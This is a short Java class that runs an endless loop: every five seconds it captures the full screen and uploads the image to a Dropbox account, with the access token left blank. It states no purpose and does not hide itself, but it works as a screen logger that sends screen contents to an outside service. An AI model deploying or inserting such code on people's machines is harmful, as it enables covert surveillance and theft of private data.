import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {
    private static final String ACCESS_TOKEN = ""; //You must enter a token for Dropbox
    @Override
    public void run() {
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
        String nameImage;
        for (;;)
        {
            try
            {
                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                ImageIO.write(image, "png", os);
                InputStream in = new ByteArrayInputStream(os.toByteArray());
                nameImage = formatter.format(new Date());
                client.files().uploadBuilder("/" + nameImage + ".png").uploadAndFinish(in);
                sleep(5000);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
